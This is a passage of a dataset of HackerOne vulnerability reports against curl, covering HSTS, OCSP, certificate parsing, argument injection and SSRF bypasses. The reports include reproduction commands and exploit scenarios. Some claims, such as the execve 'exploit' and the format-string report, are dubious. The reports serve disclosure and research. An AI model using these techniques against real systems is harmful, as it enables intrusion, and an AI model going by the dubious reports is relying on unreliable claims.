to the vulnerable program (in this case, we simulate it using execve()).\nprintf(\"[ \\* ] Sending payload...\\n\");\n\n// Use execve() to directly execute the payload\nchar \\*args[] = { \"/bin/sh\", NULL };\nexecve(\"/bin/sh\", args, NULL); // This directly executes \"/bin/sh\" with null-terminated arguments\n\n// Debugging message for any potential issues with execve()\nperror(\"execve() failed\");\n}\n\n// Main function that starts the exploit\nint main() {\nprintf(\"[ \\* ] Launching exploit, waiting for shell..\\n\");\nexploit(); // Call the exploit function to trigger the overflow and spawn the shell\nreturn 0; // Return from main, though execution should not reach here if the shell is spawned successfully\n}\n\nImpact\n------\n\nCode execution, command shell, possible system take over from this compromise..."
},
{
    "url": "https://hackerone.com/reports/2764830",
    "original_report": "Summary:\n--------\n\nSuppose my HSTS cache file has the following content:\n\nNow, I connect to <https://sub.domain.com/>. Suppose this domain now sets a HSTS policy: `Strict-Transport-Security: max-age=15768000 ; includeSubDomains`. Surprisingly my HSTS cache file now becomes:\n\nWhile the HSTS policy for \"sub.domain.com\" is correctly updated, the HSTS expiration time for \"domain.com\" is mistakenly set to be the previous expiration time for \"sub.domain.com\".\n\nIf I have multiple levels of subdomains in my HSTS cache, the situation is more confusing. Suppose my HSTS cache is:\n\nNow I connect to <https://hsts.badssl.com/index.html>. After that, the HSTS cache becomes:\n\nSteps To Reproduce:\n-------------------\n\n* curl version: curl 8.11.0-DEV (x86\\_64-pc-linux-gnu) libcurl/8.11.0-DEV OpenSSL/3.0.2 libpsl/0.21.0, curl source HEAD commit: 86d5c2651d3ea8af316eff2a2452ae61413c66ba\n* Also reproducible in curl 8.10.1 release version.\n\n  1. Create a text file `testhsts.txt` with the following content: `.badssl.com \"20241101 00:25:31\"` (less than 1 month expiration time)\n  2. Run `curl -v --hsts ./testhsts.txt \"http://hsts.badssl.com/index.html\"`. Check the content of `testhsts.txt`\n  3. Run `curl -v --hsts ./testhsts.txt \"http://hsts.badssl.com/index.html\"` again. Check the content of `testhsts.txt` again.\n* After step 2, the content of `testhsts.txt` is:\n\n* After step 3, the content of `testhsts.txt` is:\n\nYou can see the expiration time of `.badssl.com` is set incorrectly.\n\nSupporting Material/References:\n-------------------------------\n\nNone\n\nImpact\n------\n\nFor shared subdomains, i.e. different subdomains are controlled by different users, a malicious subdomain can influence the HSTS expiration time of the parent domain. By my tests, a subdomain can only increase the expiration time of its parent domain, but can't shorten it. A malicious subdomain can cause a denial of service of its parent domain, if the parent domain only plans to support HSTS for a short period of time, and wants to revert to plaintext http after a while. By exploiting this bug, the malicious subdomain can set a very long max-age for itself, and this bug can cause curl to overwrite the parent domain's HSTS expiration time to be very long."
},
{
    "url": "https://hackerone.com/reports/2819666",
    "original_report": "Summary:\n\nThe curl\\_mfprintf function in the curl\\_printf.h file contains a format string vulnerability that allows an attacker to inject arbitrary format specifiers. This can lead to unauthorized access to memory content, potential application crashes, or leakage of sensitive data.\n\nSteps To Reproduce:\n\nPrepare the Test Code: Create a new file named test\\_printf.c with the following content:\n\ninclude <stdio.h>\n=================\n\ninclude \"curl\\_printf.h\"\n========================\n\nint main() {\nchar\\* user\\_input = \"%x %x %x %x\"; // Attempt to read memory content\ncurl\\_mfprintf(stdout, user\\_input); // Passing user-controlled input to the vulnerable function\nreturn 0;\n}\n\nCompile the Code: Compile the test program with the following command:\n\nbash\n\ngcc -o test\\_printf test\\_printf.c -I./lib -I./include -L./lib/.libs -lcurl\n\nExecute the Code: Run the compiled program:\n\nbash\n\n./test\\_printf\n\nObserve the Output: The output should display memory content, which confirms that the vulnerability is exploitable.\n\nImpact\n------\n\nThis vulnerability allows an attacker to use format string specifiers to access arbitrary memory locations. By exploiting this issue, an attacker could potentially:\n\nLeak sensitive information from the process memory.\nCause a denial-of-service by crashing the application.\nFurther exploit the application depending on the context of the memory exposure."
},
{
    "url": "https://hackerone.com/reports/2792484",
    "original_report": "Summary:\n--------\n\nThe curl doc page \"SSL Ciphers\" (<https://curl.se/docs/ssl-ciphers.html>) says: \"Setting TLS 1.3 cipher suites is supported by curl with [...] Schannel (curl 7.85.0+).\" But I find that when curl uses Schannel as its TLS backend, it incorrectly enforces the TLS 1.3 cipher suites selection. For example, if I run `curl.exe --tlsv1.3 --tls13-ciphers TLS_AES_128_GCM_SHA256 -v https://example.com`, curl still accepts cipher suite TLS\\_AES\\_256\\_GCM\\_SHA384.\n\nI choose \"Medium\" severity because this bug affects the Windows 11 built-in curl (C:\\Windows\\System32\\curl.exe), and thus many batch scripts that invoke curl might be affected. If some TLS 1.3 cipher suites are found to be vulnerable in the future, this bug can give users harder time to disable such insecure TLS 1.3 cipher suites in curl.\n\nSteps To Reproduce:\n-------------------\n\n1. Build curl on Windows with Schannel as its TLS backend (I used `nmake /f Makefile.vc mode=static VC=22 ENABLE_SCHANNEL=yes ENABLE_UNICODE=yes` to build curl). You can also repro with Windows 11 built-in curl.exe at `C:\\Windows\\System32\\curl.exe`\n2. Open WireShark. Capture traffic, and set filter to show traffic to example.com only\n3. Run `curl.exe --tlsv1.3 --tls13-ciphers TLS_AES_128_GCM_SHA256 -v https://example.com`\n4. View the TLS handshakes in WireShark. You can see that the Server Hello message shows it uses TLS\\_AES\\_256\\_GCM\\_SHA384.\n\nReproducible on these curl versions:\n\n1. The current Windows 11 built-in curl:\n\n2. curl built from the source on GitHub. Version 8.11.0-DEV. Commit e29629a402a32e1eb92c0d8af9a3a49712df4cfb\n\nSupporting Material/References:\n-------------------------------\n\n* <https://curl.se/docs/ssl-ciphers.html>\n\nImpact\n------\n\nWhen users specify `--tls13-ciphers` parameter, curl silently uses a TLS 1.3 cipher suite that is not selected by users. This can cause TLS connections use weak cipher suites. If in the future `TLS_AES_256_GCM_SHA384` becomes weak or broken, and users want to use `TLS_AES_128_GCM_SHA256` (or vice versa), curl can potentially leak data to man-in-the-middle attackers, because curl uses the wrong cipher."
},
{
    "url": "https://hackerone.com/reports/2669852",
    "original_report": "Summary:\n--------\n\nWhen the TLS backend is GnuTLS, there is an issue with the OCSP stapling validation process. As a result, even if the certificate is revoked, the connection can be established without resulting in an error.\n\nWhen the OCSP stapling status response is \"revoked,\" gnutls\\_certificate\\_verify\\_peers2() returns an error. However, gnutls\\_certificate\\_verify\\_peers2() only returns an error when the OCSP status is \"revoked.\" For other statuses, gnutls\\_certificate\\_verify\\_peers2() returns a successful result.\n\nIn curl, the verification of the OCSP stapling status response is performed not only with the above function but also with gnutls\\_ocsp\\_status\\_request\\_is\\_checked(). However, this function returns a non-zero value if the OCSP stapling status response exists. As a result, if any response exists, it is treated as a successful case, and the verification process concludes.\n\nSteps To Reproduce:\n-------------------\n\nI have set up a test site, so please try it out.\nOCSP stapling status response is configured to return \"unauthorized (6).\"\n\n1. Prepare curl with GnuTLS backend.\n2. curl <https://ocsp4test.sytes.net:4433> --cert-status\n\nAn error will occur if the TLS backend is OpenSSL.\n\nI noticed while researching that starting from GnuTLS 3.1.2, OCSP stapling is enabled by default with gnutls\\_init. As a result, whether you specify --cert-status or not, the behavior remains the same (currently, in the curl source code, it is not possible to disable OCSP stapling).\n<https://www.gnutls.org/manual/html_node/Session-initialization.html>\n\nImpact\n------\n\nBypassing OCSP verification."
},
{
    "url": "https://hackerone.com/reports/2629968",
    "original_report": "Summary:\n--------\n\nWhen a specially-crafted certificate is passed to `Curl_extract_certinfo` to parse, it may read bytes beyond the end of the buffer in which the certificate is held. According to the application, this may be a stack read overflow or a heap read overflow.\n\nSpecifically the issue is in function `GTime2str`, in which the specially-crafted input may cause it to set `fracl = -1` and then pass it to `Curl_dyn_addf`, which in turn treats this `-1` as \"no length given\" and goes on to run `strlen(tzp)` which goes beyond the end of the certificate buffer (assuming there are no null bytes).\n\nI believe the issue is in this loop (in `lib/vtls/x509asn1.c`):\n\nIf `tzp == fracp`, then `fracl` is set to -1 in the loop initialization.\n\nI tested this on curl 8.9.0 commit `2a59c8d4cebfd199f930213ee82ae95f71e44578` (2024-07-24). I haven't looked when the issue was introduced.\n\nSteps To Reproduce:\n-------------------\n\n1. Compile libcurl with `-fsanitize=address` and with gnutls. I used clang. `CC=clang CFLAGS=-fsanitize=address ../configure --disable-shared --enable-debug --with-gnutls=/usr/lib/aarch64-linux-gnu`\n2. Compile the attached `poc.c` program which uses libcurl's `Curl_extract_certinfo`.\n3. Run `./poc bad_cert_1.bin`\n\nThe resulting report from AddressSanitizer:\n\nNote that this will only affect libcurl when built with gnutls, schannel, sectransp, mbedtls (only then it'll use `Curl_extract_certinfo`).\n\nSupporting Material/References:\n-------------------------------\n\n* `poc.c`: The client code to reproduce; it simply reads a file and passes its content to `Curl_extract_certinfo`. The code uses a buffer on the stack, but it also works if you switch it to be a heap buffer (see the commented-out malloc call).\n* `bad_cert_1.bin`: The certificate with which causes the memory over-read.\n\nSubmitter info\n--------------\n\n* I used LLVM libFuzzer to find this.\n* If this is accepted, please credit the finding to Dov Murik from Transmit Security.\n* If this is eligible for any bug bounty, please donate it to the curl project.\n\nImpact\n------\n\nAttacker-controller HTTPS server can return a specially-crafted certificates that can crash libcurl-based clients when fetching the certificates and parsing them.\n\nI couldn't see a way where the remote attacker can actually get the content of the over-read memory bytes."
},
{
    "url": "https://hackerone.com/reports/2559516",
    "original_report": "Libcurl at commit [04739054cdac5a0614fb94e3655e313c03399f35](https://github.com/curl/curl/tree/04739054cdac5a0614fb94e3655e313c03399f35) contains an invalid invocation of `free()` in the function `utf8asn1str()` at [lib/vtls/x509asn1.c:397](https://github.com/curl/curl/blob/04739054cdac5a0614fb94e3655e313c03399f35/lib/vtls/x509asn1.c#L397).\n\nThe relevant code can be seen below:\n\n`buf` is located on the stack and not the heap, which means that `buf` will be falsely treated as a heap chunk.\nThis poses a security risk because the address of `buf` can be returned in subsequent calls to `malloc()`, which causes\nthe stack contents at that point to be overwritten.\nThe stack holds data that determines the control flow of the application. This can either be local variables that indirectly\ndetermine the control flow of their corresponding functions or security-critical metadata liked saved framepointers or return addresses.\nIf an attacker manages to overwrite these kinds of stack contents he/she can gain control over the control flow of the application.\n\nExploit Scenario\n================\n\nConsider the following scenario that demonstrates how to leverage the invalid `free()` to overwrite return addresses:\n\n1. The attacker sets up a malicious server with a TLS certificate that triggers the invalid `free()`\n2. An application using libcurl connects to the server and during the connect() phase parses the invalid certificate.\n   This causes the stack address to be put into the freelist of the allocator.\n3. The attacker interacts with the client in a way that causes the stack address to be returned by a `malloc()` call\n   and used to store data from the attacker\n4. Depending on the state of the stack, the attacker can now overwrite local variables, pointers or security-critical metadata.\n   The worst case would be that a return address gets overwritten with a [ROP-chain](https://en.wikipedia.org/wiki/Return-oriented_programming) in order to\n   gain control over the execution of the program\n\nOne environment where that scenario could work out is Ubuntu bionic, where the glibc does not check whether the argument to `free()` actually refers to a valid heap chunk.\n\nPatch\n=====\n\nThe fix for this vulnerability is pretty straight forward, just remove the call to `free()`:\n\nImpact\n------\n\nI assess the impact of this vulnerability to be \"High\" because\n\n1. The invalid `free()` is easy to trigger since it happens during the TLS handshake\n2. An overwrite of memory contents with attacker-controlled data poses a great security risk"
},
{
    "url": "https://hackerone.com/reports/2604391",
    "original_report": "libcurl at commit [58772b0e082eda333e0a5fc8fb0bc7f17a3cd99c](https://github.com/curl/curl/tree/58772b0e082eda333e0a5fc8fb0bc7f17a3cd99c) contains a stack-buffer overread in [lib/idn.c:75](https://github.com/curl/curl/blob/58772b0e082eda333e0a5fc8fb0bc7f17a3cd99c/lib/idn.c#L75) that can be triggered when the host of a URL is converted to punycode.\n\nThe root cause of the bug is in the function `mac_idn_to_ascii()`:\n\n`buffer` is supposed to hold the punycode-encoded version of `in` as a NUL-terminated string. However\nthe implementation of `uidna_nameToASCII_UTF8()` leaves the output buffer unterminated when the length of the encoded output is equal to\nthe capacity of the output buffer ([source](https://github.com/unicode-org/icu/blob/main/icu4c/source/common/ustring.cpp#L1437)).\nThis leaves `buffer` without a terminating NUL-byte and the subsequent call to `strdup(buffer)` includes bytes beyond `buffer`.\n\nPoC\n===\n\nConsider the following dummy application that takes a URL as an argument and prints its punycode-encoded version:\n\nThen\n\nresults in the over-read:\n\nNote: In order to trigger the vulnerability on a non-apple device, compile curl with `-DUSE_APPLE_IDN -licuuc`.\n\nExploitation Scenario\n=====================\n\nExploitation of this bug has three strict requirements:\n\n1. An attacker has control over the URL in `curl_url_set()`\n2. The application manually calls `curl_url_get()` with `CURLU_PUNYCODE` and the attacker-provided URL\n3. The resulting URL is mirrored back to the attacker or used to make a transfer\n\nFor any application that fulfills these three requirements this vulnerability can be used to leak pointers in the stackframe of `mac_idn_to_ascii()`.\nDepending on what is adjacent to `buffer` the following information could be leaked:\n\n* Base address of the stack when the framepointer follows `buffer`\n* Base address of the application/libcurl when the return address follows `buffer` (`-fomit-frame-pointer`)\n* Base address of the heap if the variable `UIDNA* idna` follows the buffer\n\nAny of these information leaks bring down exploit mitigations like [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) or [PIE](https://en.wikipedia.org/wiki/Position-independent_code) and contribute largely to successful exploitation of other memory corruption vulnerabilities.\n\nPatch\n=====\n\nI suggest the following patch, inspired by [PHP's handling](https://github.com/php/php-src/blob/master/ext/intl/idn/idn.c#L69) of `uidna_nameToASCII_UTF8()`:\n\nImpact\n------\n\nThe vulnerability\n\n* does not affect the majority of curl installations\n* has strict requirements to work\n* even then only leads to an information leak and nothing worse\n\nHowever, leaking memory content is still security-relevant so I suggest severity \"Low\"."
},
{
    "url": "https://hackerone.com/reports/2559558",
    "original_report": "libcurl at commit [04739054cdac5a0614fb94e3655e313c03399f35](https://github.com/curl/curl/tree/04739054cdac5a0614fb94e3655e313c03399f35) contains a NULL-dereference in function `encodeDN()` when parsing the certificate of a server during the TLS connect-phase.\n\nThe vulnerable code is in [lib/vtls/x509asn1.c:701](https://github.com/curl/curl/blob/04739054cdac5a0614fb94e3655e313c03399f35/lib/vtls/x509asn1.c#L701):\n\nWhen the `oid` that `ASN1tostr` tries to convert to a string is an element that is constructed such that `oid.constructed` is 1\n`ASN1tostr` returns without touching the dynbuf `temp`. The following `Curl_dyn_ptr()` returns NULL and `ISUPPER(*p3)` causes\nthe application to crash.\n\nExploit scenario\n================\n\nThe following exploit scenario demonstrates how to terminate an application using libcurl with the NULL dereference from above:\n\n1. Setup a malicious server with a TLS certificate that triggers the crash\n2. When a client connects over TLS, send the invalid certificate. This causes the client to terminate and no longer serve its purpose\n\nImpact\n------\n\nThe null dereference causes a DOS on applications using libcurl to do TLS-encrypted connections.\nIt requires no special setup to trigger the crash, since it is triggered during the connect-phase of the\nconnection. Thus I chose severity \"Low\"."
},
{
    "url": "https://hackerone.com/reports/2550951",
    "original_report": "Hello cURL team,\n\nI am splitline from DEVCORE Research Team. We recently found a vulnerability on cURL. We have reproduced the issues in the latest version of cURL (curl-8.8.0\\_1) and would like to report it to you. Please check the attached document for details.\n\nThis advisory is in accordance with our vulnerability disclosure policy, which will be publicly disclosed after 90 days. Our aim is to ensure that vulnerabilities can be patched in a timely manner. Although it’s not a hard deadline, we still hope you can fix this vulnerability before September 11, 2024.\n\nPlease let me know if you have any questions, thanks!\n\n### Summary\n\nWe noticed that the misuse of the Windows ANSI API in cURL could result in unexpected argument parsing behaviour for cURL. This could consequently lead to argument injection when invoking the `curl.exe` from the command line.\n\n### Affected Environment\n\n* Operation System: Microsoft Windows\n  + Tested on Windows 10/11, should also work on most of the versions.\n* Language (system locale):\n  + CP874: Thai\n  + CP1250: Central European language (e.g. English, German, Polish)\n  + CP1251: Cyrillic\n  + CP1252: Western European language (e.g. English, Spanish, French)\n  + CP1253: Greek\n  + CP1254: Turkish\n  + CP1255: Hebrew\n  + CP1256: Arabic\n  + CP1257: Baltic\n  + CP1258: Vietnamese\n  + (Does NOT affect Chinese, Japanese and Korean)\n\n### Description\n\nFirstly, on Windows, command line arguments are passed as a string and are parsed by the executable itself. In contrast, on Linux, arguments are always passed to the executable as an array of strings.\n\nSecondly, Windows exists a behavior known as \"Best Fit\" encoding conversion[`[1]`](https://www.unicode.org/Public/MAPPINGS/VENDORS/MICSFT/WindowsBestFit/readme.txt)[`[2]`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ucoderef/d1980631-6401-428e-a49d-d71394be7da8). This occurs when Windows needs to convert characters between Unicode UTF-16 (WideChar) and ANSI (MultiByte). For instance, if a Unicode character `＂` (U+FF02, fullwidth double quote) is passed as an argument but received with the [`GetCommandLineA`](https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getcommandlinea) ANSI API, in certain system locales, it will trigger the \"best fit\" behavior and convert this Unicode UTF-16 character into `\"` (0x22, double quote).\n\nHere in our case, `curl.exe` receives the command line string using ANSI API. So if you pass some Unicode characters into those executables, it will be converted to another character, which leads to an unexpected argument parsing result in the end.\n\n### Examples / Step to reproduce\n\nBefore we start, we need to make sure the Windows system locale is configured to any of the following language types: Central European, Western European, Greek, Hebrew, Baltic, Cyrillic, Arabic, Turkish, Vietnamese or Thai. You can check your codepage by the following command:\n\nIf your computer is currently not configured to that language, here are the detailed steps to do the configuration (for Windows 11):\n\n1. Go to \"Settings\" > \"Time & Language\" > \"Language & Region\"\n2. Click the \"Administrative language settings\" item (in the \"Related settings\" section)\n3. In the \"Language for non-Unicode programs\" section, click the \"Change system locales\" button. Set the system locale to any of the languages we mentioned. Here we can take \"English (United States)\" as an example. (Remember to restart your machine)\n4. Check the codepage again with the command we mentioned: `powershell.exe [Console]::OutputEncoding.WindowsCodePage`. It should be `1252` if you chose \"English (United States)\".\n\nHere we opt for Node.js, Python and PHP as some examples.\n\nIn the subsequent three scenarios, where argument escaping or argument separating could fail, leading to argument injection. Furthermore, there's also the potential for executing arbitrary commands. As an illustration, we simply demonstrate by writing file into temp directory.\n\nEnsure to substitute `malicious.tld` and `<username>` in the following scripts with a appropriate values on your system. In this context, `malicious.tld` denotes a domain or website controlled by a malicious actor, while `<username>` represents the username of the current user.\n\nIn Node.js:\n\nIn Python:\n\nIn PHP:\n\nFor the 3 preceding instances, they all result in the following parsing result in command line and `curl.exe`:\n\nIn command line:\n\nIn `curl.exe`\n\nNotice that U+FF02 isn't the only character that can be converted to a double quote; it's simply one example among many. For the full conversion tables, we can refer to [the document from Unicode.Org](https://www.unicode.org/Public/MAPPINGS/VENDORS/MICSFT/WindowsBestFit/readme.txt). Consequently, given this characteristic, it becomes exceedingly challenging for other programming languages to adequately handle argument escaping.\n\n### Suggested Remediation\n\n1. Avoid the using of the [ANSI Windows API](https://learn.microsoft.com/en-us/windows/win32/intl/unicode-in-the-windows-api) to get and parse the command line.\n2. If you didn't explicitly use the ANSI Windows API, it might be used by the compiler or standard library itself, there are several ways to hint the compiler to use UTF-16 (WideChar) API.\n   1. Use `wmain` function as the main function: <https://learn.microsoft.com/en-us/cpp/c-language/using-wmain?view=msvc-170>\n   2. Use the -municode flag while compiling: <https://sourceforge.net/p/mingw-w64/wiki2/Unicode%20apps/>\n\n### Credit Discovery To\n\nOrange Tsai ([@orange\\_8361](/orange_8361)) and splitline ([@splitline](/splitline)) from DEVCORE Research Team\n\nImpact\n------\n\nIf an application invokes the `curl.exe` from the command line, and any part of an argument can be controlled by a user then it can lead to argument injection."
},
{
    "url": "https://hackerone.com/reports/2552179",
    "original_report": "Summary:\n--------\n\nBest-Fit is a character mapping strategy designed to resolve the issue when characters in the source code page lack a direct equivalent in the target code page. During the conversion of characters from a Unicode code page to a non-Unicode code page, if a corresponding character cannot be located, the conversion is carried out using a predefined Best-Fit conversion table.\n\nFor instance, the Best-Fit Mapping conversion table for GBK encoding (cp936) can be found at: <https://www.unicode.org/Public/MAPPINGS/VENDORS/MICSFT/WindowsBestFit/bestfit936.txt>\n\nThis table contains some intriguing character conversions, such as 0xb9 being mapped to 1 and 0xb2 being mapped to 2. By exploiting this conversion feature, it is possible to construct a hostname that causes curl to initiate network requests to unintended locations, potentially resulting in an SSRF vulnerability.\n\nInitially, this parsing feature was utilized by orange from the DEVCORE team to circumvent the defenses in [CVE-2012-1823](https://www.kb.cert.org/vuls/id/520827) and subsequently discover the vulnerability [CVE-2024-4577](https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/). However, our research team’s testing has revealed that curl supports partial best-fit conversion features on all Chinese operating systems. By exploiting this parsing issue, it is possible to create certain security impacts.\n\nDetails\n-------\n\n### Affected components\n\nThe vulnerable component is:\n\n* curl: <https://github.com/curl/curl>\n* 8.7.1 and below\n\nThe operating systems affected are:\n\nThis feature is supported on Windows, macOS, and Ubuntu (Linux) operating systems with Traditional Chinese, Simplified Chinese, and Japanese language settings.\n\nSteps To Reproduce:\n-------------------\n\nWe constructed the following payload:\n\nThe character mapping relationships are as follows:\n\n0xb9 --> displayed as ¹ --> parsed by curl as 1\n\n0xb2 --> displayed as ² --> parsed by curl as 2\n\nThe parsing behavior of curl clearly adheres to [CODEPAGE 936](https://www.unicode.org/Public/MAPPINGS/VENDORS/MICSFT/WindowsBestFit/bestfit936.txt)\n\nWe are uncertain whether the display of ¹² varies across different operating systems, but here is a comparison result provided by Python, demonstrating that ¹² != 12.\n\n### Test\n\nThe PoC used for testing here is shown below.\n\nI set up an HTTP server on my local machine using port 80 with the following Python code. Upon a successful request, the server will return the string \"FindVuln\".\n\nFigure 1 illustrates the parsing behavior of curl on a Chinese Ubuntu system. It can be observed that a request was successfully made to 127.0.0.1, even though the input hostname was different [¹²7.0.0.1].\n\nFigure 2 illustrates the parsing behavior of curl on an English Ubuntu system. It shows that the best-fit encoding conversion was not followed, which is expected since the English operating system does not support GBK encoding.\n\nFigure 3 illustrates the parsing behavior of curl on a Chinese macOS system.\n\nFigure 4 illustrates the parsing behavior of curl on a Chinese Windows system.\n\nImpact\n------\n\nThe impact of this vulnerability is huge because the `curl` is widely used. In many cases, developers need a blocklist to block on some IPs. However, the vulnerability will help attackers bypass the protections that developers have set up for schemes and hosts. The vulnerability will lead to SSRF[1] and RCE[2] vulnerabilities in several cases.\n\nImpact\n------\n\nAttackers can exploit this parsing difference to initiate requests to unexpected locations, thereby causing potential SSRF vulnerability threats."
},
{
    "url": "https://hackerone.com/reports/2552192",
    "original_report": "Summary:\n--------\n\nCurl's unrestricted header storage lets malicious servers overwhelm memory, leading to out of Memory ( DOS) . When curl retrieves an HTTP response, it stores the incoming headers so that they can be accessed later via the libcurl headers API. However, curl did not have a limit on how many or large headers it would accept in response, allowing a malicious server to stream an endless series of headers and eventually cause curl to run out of heap memory.\n\n**Tested Versions**\n\n**Vulnerability insight**\n\nFrom the breakdown of the below , we can see that the vulnerability is found where cURL cannot limit the number of headers to be stored.\nHeaders are fundamental in HTTP communication, providing metadata and instructions for how requests and responses should be handled (such as Host, Set-Cookie, Content-Type, Content-Length, etc.). Typically, headers are stored directly in memory so that they can be accessed by applications via the libcurl headers API.If cURL does not enforce limits on the number or size of headers, it can lead to memory exhaustion and potential application crashes, causing a denial of service (DoS) attack.\nNow consider this vulnerable code snippet of transfer.c file of cURL's core library. This file handles data transfers, managing the process of sending requests and receiving responses over various protocols (like HTTP, FTP, etc.).\n\nSteps To Reproduce:\n-------------------\n\n1. This is a Python script which creates a simple HTTP server that serves as an exploit server , It is designed to simulate a vulnerability where an excessive number of HTTP headers are sent in the response, potentially causing memory exhaustion on the client side.\n\n2 . Next, we create a bash file called curl\\_memory.sh. Copy the bash script into the bash file , Below is the bash script. This will be used to run the exploit\\_server.py file and curl command .\n\n3. To check the memory while running the script, open another terminal and run.\n\nOnce that is done, we run these commands:\n\n**Mitigation**\n\n1. Enforce Header Limits: Set restrictions on header size and number using curl options.\n2. Review Application Code: Check your code for proper handling of HTTP response headers to prevent memory issues.\n3. Network Filtering: Employ firewalls or WAFs to detect and block malicious traffic exploiting this vulnerability.\n4. Monitor Memory Usage: Regularly monitor memory usage and set up alerts for abnormal consumption.\n\nSupporting Material/References:\n-------------------------------\n\n<https://learn.microsoft.com/en-us/answers/questions/1409035/curl-7-69-(-8-4-0-heap-buffer-overflow-and-curl-7>\n<https://hackerone.com/reports/2072338>\n\nImpact\n------\n\nDOS/overloading of user's system through malicious HTTP server interaction with curl's header parsing."
},
{
    "url": "https://hackerone.com/reports/2493548",
    "original_report": "Summary:\n--------\n\nOctal Type Handling of Errors in IPv4 Mapped IPv6 Addresses in curl allows unauthenticated remote attackers to perform indeterminate SSRF, RFI, and LFI attacks on many programs that rely on curl.\n\n[RFC 4291](https://datatracker.ietf.org/doc/html/rfc4291#section-2-5-5) defines ways to embed an IPv4 address into IPv6 addresses. One of the methods defined in the RFC is to use IPv4-mapped IPv6 addresses, that have the following format:\n\nIn IPv6 notation, the corresponding mapping for `127.0.0.1` is `::ffff:127.0.0.1` ([RFC 4038](https://datatracker.ietf.org/doc/html/rfc4038)). Although curl correctly converts octal numbers starting with 0 in IPv4 format, such as recognizing 0177.0.0.1 as 127.0.0.1, it fails to properly identify the data format of 0127.0.0.1 in IPv4-mapped IPv6 addresses. The curl command automatically removes the leading zeros from IP addresses in the format ::ffff:0127.0.0.1, and sends requests to 127.0.0.1 instead. This behavior can undermine defensive strategies that restrict access to 127.0.0.1, potentially leading to security threats such as Server-Side Request Forgery (SSRF) and Remote Code Execution (RCE) on the server.\n\nSteps To Reproduce:\n-------------------\n\n### 2.1 Affected components\n\nThe vulnerable component is:\n\n* curl: <https://github.com/curl/curl>\n* 8.7.1 and below\n\n### 2.2 Attack scenario\n\nA typical attack scenario is illustrated in the diagram below. The Validator checks whether the attacker-supplied URL is on the blocklist. If not, the URL is passed to the Requester for processing. The Requester is responsible for sending requests to the hostname specified by the URL.\n\n### 2.3 PoC\n\npayloads:\n\nYou can verify this issue using the sample program below. Simply replace the payload variable in the verify function with the above payload to conduct the test.\n\nI set up an HTTP server on my local machine using port 80 with the following Python code. Upon a successful request, the server will return the string \"FindVuln\".\n\nFigure 1 illustrates how curl handles IPv4 addresses, while Figure 2 demonstrates curl's processing of IPv4-mapped IPv6 representations.\n\nFigure 1:\n\nFigure 2:\n\nMitigation\n----------\n\nPlease refer to [RFC 4291](https://datatracker.ietf.org/doc/html/rfc4291#section-2-5-5) and [RFC 4038](https://datatracker.ietf.org/doc/html/rfc4038) to fix this function.\n\nSupporting Material/References:\n-------------------------------\n\nThis security issue has also been identified in other libraries, and CVE IDs have been assigned. For more information, refer to [1], [2], [3] and [4].\n\n[1] <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-24329>\n\n[2] <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-22243>\n\n[3] <https://sick.codes/sick-2021-015/>\n\n[4] <https://sick.codes/sick-2021-016/>\n\nImpact\n------\n\nThe impact of this vulnerability is huge because the `curl` is widely used. In many cases, developers need a blocklist to block on some IPs. However, the vulnerability will help attackers bypass the protection developers have set up for schemes and hosts. The vulnerability will lead to SSRF[1] and RCE[2] vulnerabilities in several cases.\n\n[1] <https://cwe.mitre.org/data/definitions/918.html>\n[2] <https://cwe.mitre.org/data/definitions/94.html>"
},
{
    "url": "https://hackerone.com/reports/2352676",
    "original_report": "Summary:\n--------\n\n[add summary of the vulnerability]\n\nCurl can be coaxed to leak user credentials to third-party host by issuing HTTP redirect.\n\nSteps To Reproduce:\n-------------------\n\n[add details for how we can reproduce the issue]\n\n1.Create a 302.php file, such as:\n\nAdd the 2 record in the /etc/hosts file:\n\n2. curl -vv --cookie 'aaa=2222' <http://b.com/302a.php> -L\n   The redirect will be followed, and the confidential headers cookie will be sent to a.com:\n\nThis does not comply with RFC regulations and is inconsistent with browser behavior, and RFC also states that redirection requires deleting cookies.\n<https://www.ietf.org/rfc/rfc9110.txt>\n\nSupporting Material/References:\n-------------------------------\n\n[list any additional material (e.g. screenshots, logs, etc.)]\n\n* [attachment / reference]\n  <https://www.ietf.org/rfc/rfc9110.txt>\n\nImpact\n------\n\nLeak of confidential information (user credentials)."
},
{
    "url": "https://hackerone.com/reports/2384833",
    "original_report": "Summary:\n--------\n\n`--proto` in some circumstances ENABLES all protocols after being given `-all`, potentially leading to sending sensitive data over an unencrypted channel.\n\nSteps To Reproduce:\n-------------------\n\n`curl -Ivs --proto -all,-http http://curl.se`\nThis command should result in `curl: (1) Protocol \"http\" disabled` but it actually succeeds.\n\nSupporting Material/References:\n-------------------------------\n\nThe example command above performs a request to curl.se over http, despite being http support being disabled, both implicitly (-all) and explicitly (-http). It appears that a `--proto` string starting with `-all` and only ever removes protocols without adding them fails in this way. For example:\n\nExample failure scenarios (allowing ALL protocols to go through):\n\nExample correct scenarios (behaving as documented):\n\nThe only failure scenarios I could find were those that first removed all protocols with -all, then (optionally) removed additional, individual\nprotocols, and never added any. The documented behaviour for this would be to fail ALL curl transfers, so it shouldn't happen anywhere in production\nsituations (since generally people want to do transfers with curl). However, I could still imagine it happening, such as when the list of allowed protocols is programmatically computed in a system where a particular situation should not allow any transfers. But this bug means that transfers would go ahead, anyway.\n\nIn a situation where something is relying on curl to block an unencrypted transfer, the consequences of this bug can be pretty severe (unencrypted data travelling over the Internet) and therefore High severity. On the other hand, IF this is the only situation where this bug occurs (where all protocols are supposed to be disabled), then I'm guessing this generally pretty uncommon and therefore Medium or even Low may be more appropriate. It's hard to know if anyone is relying on this.\n\nI bisected the problem to [this commit](https://github.com/curl/curl/commit/e6f8445edef8e7996d1cfb141d6df184efef972c) which was released in 7.85.0 and introduced string-based protocol selection:\n\nI discovered it while replying to <https://github.com/curl/curl/issues/12942>\n\nAn example test case to show the problem is attached.\n\nImpact\n------\n\nData can be sent over an unencrypted channel because curl'ls mechanism to prevent it does not work."
},
{
    "url": "https://hackerone.com/reports/2402853",
